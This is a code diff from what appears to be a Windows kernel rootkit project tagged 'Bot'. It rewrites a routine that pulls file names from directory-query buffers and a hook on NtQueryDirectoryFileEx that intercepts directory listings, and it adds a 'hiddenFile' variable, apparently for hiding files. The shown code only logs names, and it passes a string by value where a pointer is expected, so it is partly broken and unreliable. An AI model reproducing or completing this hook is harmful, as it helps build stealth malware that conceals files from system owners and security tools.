@@ -3,42 +3,51 @@
 #include "querydir.h"
 #include "handler.h"
 
-//n00bk1t
-//TODO: replace with my code
-PVOID getDirEntryFileName(
-        PVOID FileInformationBuffer,
-        FILE_INFORMATION_CLASS FileInfoClass
-)
-{
-        PVOID pvResult = NULL;
-        switch (FileInfoClass)
-        {
-        case FileDirectoryInformation:
-		DbgPrintEx(0, 0, "[Bot] dir FileDirectoryInformation\n");
-                pvResult = (PVOID) & ((PFILE_DIRECTORY_INFORMATION)FileInformationBuffer)->FileName[0];
-                break;
-        case FileFullDirectoryInformation:
-		DbgPrintEx(0, 0, "[Bot] dir FileFullDirectoryInformation\n");
-                pvResult = (PVOID) & ((PFILE_FULL_DIR_INFORMATION)FileInformationBuffer)->FileName[0];
-                break;
-        case FileIdFullDirectoryInformation:
-		DbgPrintEx(0, 0, "[Bot] dir FileIdFullDirectoryInformation\n");
-                pvResult = (PVOID) & ((PFILE_ID_FULL_DIR_INFORMATION)FileInformationBuffer)->FileName[0];
-                break;
-        case FileBothDirectoryInformation:
-		DbgPrintEx(0, 0, "[Bot] dir FileBothDirectoryInformation\n");
-                pvResult = (PVOID) & ((PFILE_BOTH_DIR_INFORMATION)FileInformationBuffer)->FileName[0];
-                break;
-        case FileIdBothDirectoryInformation:
-		DbgPrintEx(0, 0, "[Bot] dir FileIdBothDirectoryInformation\n");
-                pvResult = (PVOID) & ((PFILE_ID_BOTH_DIR_INFORMATION)FileInformationBuffer)->FileName[0];
-                break;
-        case FileNamesInformation:
-		DbgPrintEx(0, 0, "[Bot] dir FileNamesInformation\n");
-                pvResult = (PVOID) & ((PFILE_NAMES_INFORMATION)FileInformationBuffer)->FileName[0];
-                break;
-        }
-        return pvResult;
+UNICODE_STRING hiddenFile;
+
+static void getFileName(PUNICODE_STRING filename, PVOID fileInfo, FILE_INFORMATION_CLASS fileInfoClass) {
+	switch (fileInfoClass) {
+		case FileDirectoryInformation:
+			filename->Buffer = ((PFILE_DIRECTORY_INFORMATION)fileInfo)->FileName;
+			filename->Length = ((PFILE_DIRECTORY_INFORMATION)fileInfo)->FileNameLength;
+			break;
+		case FileFullDirectoryInformation:
+			filename->Buffer = ((PFILE_FULL_DIR_INFORMATION)fileInfo)->FileName;
+			filename->Length = ((PFILE_FULL_DIR_INFORMATION)fileInfo)->FileNameLength;
+			break;
+		case FileBothDirectoryInformation:
+			filename->Buffer = ((PFILE_BOTH_DIR_INFORMATION)fileInfo)->FileName;
+			filename->Length = ((PFILE_BOTH_DIR_INFORMATION)fileInfo)->FileNameLength;
+			break;
+		case FileNamesInformation:
+			filename->Buffer = ((PFILE_NAMES_INFORMATION)fileInfo)->FileName;
+			filename->Length = ((PFILE_NAMES_INFORMATION)fileInfo)->FileNameLength;
+			break;
+		case FileIdBothDirectoryInformation:
+			filename->Buffer = ((PFILE_ID_BOTH_DIR_INFORMATION)fileInfo)->FileName;
+			filename->Length = ((PFILE_ID_BOTH_DIR_INFORMATION)fileInfo)->FileNameLength;
+			break;
+		case FileIdFullDirectoryInformation:
+			filename->Buffer = ((PFILE_ID_FULL_DIR_INFORMATION)fileInfo)->FileName;
+			filename->Length = ((PFILE_ID_FULL_DIR_INFORMATION)fileInfo)->FileNameLength;
+			break;
+		case FileIdGlobalTxDirectoryInformation:
+			filename->Buffer = ((PFILE_ID_GLOBAL_TX_DIR_INFORMATION)fileInfo)->FileName;
+			filename->Length = ((PFILE_ID_GLOBAL_TX_DIR_INFORMATION)fileInfo)->FileNameLength;
+			break;
+		case FileIdExtdDirectoryInformation:
+			filename->Buffer = ((PFILE_ID_EXTD_DIR_INFORMATION)fileInfo)->FileName;
+			filename->Length = ((PFILE_ID_EXTD_DIR_INFORMATION)fileInfo)->FileNameLength;
+			break;
+		case FileIdExtdBothDirectoryInformation:
+			filename->Buffer = ((PFILE_ID_EXTD_BOTH_DIR_INFORMATION)fileInfo)->FileName;
+			filename->Length = ((PFILE_ID_EXTD_BOTH_DIR_INFORMATION)fileInfo)->FileNameLength;
+			break;
+		default:
+			filename->Buffer = NULL;
+			filename->Length = 0;
+			break;
+	}
 }
 
 NTSTATUS NTAPI hookNtQueryDirectoryFileEx(
@@ -53,9 +62,14 @@ NTSTATUS NTAPI hookNtQueryDirectoryFileEx(
 	ULONG QueryFlags,  // Valid flags are in SL_QUERY_DIRECTORY_MASK
 	PUNICODE_STRING FileName
 ) {
-        PVOID str = getDirEntryFileName(FileInformation, FileInformationClass);
-        if (str)
-		DbgPrintEx(0, 0, "[Bot] dir hook %ws\n", (WCHAR*)str);
+	NTSTATUS status;
+	UNICODE_STRING us;
+
+	status = origNtQueryDirectoryFileEx(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, QueryFlags, FileName);
+
+	getFileName(&us, FileInformation, FileInformationClass);
+
+	DbgPrintEx(0, 0, "[Bot] dir hook %wZ\n", us);
 	
-	return origNtQueryDirectoryFileEx(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, QueryFlags, FileName);
+	return status;
 }
